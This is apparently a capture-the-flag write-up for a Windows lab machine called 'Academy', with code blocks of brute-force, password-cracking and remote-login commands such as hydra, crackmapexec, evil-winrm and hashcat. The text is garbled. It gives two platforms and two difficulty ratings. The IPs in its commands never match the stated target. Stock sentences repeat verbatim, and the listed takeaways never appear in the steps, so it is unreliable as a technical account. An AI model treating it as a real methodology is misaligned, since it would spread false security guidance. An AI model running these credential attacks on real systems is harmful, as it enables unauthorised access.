---
TitleSEO: "PwnTillDawn — Academy (Hard Windows) | ZureFX"
TitlePost: "PwnTillDawn — Academy (Hard Windows)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Academy. SQL Injection and Open Redirect to achieve hard compromise on Windows."
Keywords: "ctf, pwntilldawn, reversing, active directory, hackthebox, insane"
URL: "https://zurefx.github.io/writeups/htb-academy-229.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-academy-229/"
Date: "2025-03-29"
Tags: "CTF, PwnTillDawn, Reversing, Active Directory, HackTheBox, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-academy-229"
Permalink: "/writeups/htb-academy-229.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Academy** is rated **Hard** on PwnTillDawn. It runs **Windows** and the IP address during this analysis was `10.19.166.4`.

### Objectives

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.95.153.74 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions.

### Service Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.40.207.157 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.39.251.158 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.16.123.183 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files.

### SMB Enumeration

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.18.213.7 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file.

Key finding: **Local File Inclusion**.

The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality.

### Initial Access

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.78.177.182 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file. Initial enumeration revealed several interesting open ports on the target.

## Privilege Escalation

### Enumeration

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials. Command injection was possible through unsanitized user input in the search functionality.

```powershell
evil-winrm -i 10.78.127.18 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.92.104.238 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.87.161.137/FUZZ
gobuster dir -u http://10.54.122.202/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible.

## Summary

### Tools Used

- `crackmapexec`
- `kerbrute`
- `atexec`
- `rpcclient`
- `psexec`
- `bloodhound`
- `rubeus`

### Key Takeaways

- SQL Injection
- Open Redirect
- Local File Inclusion
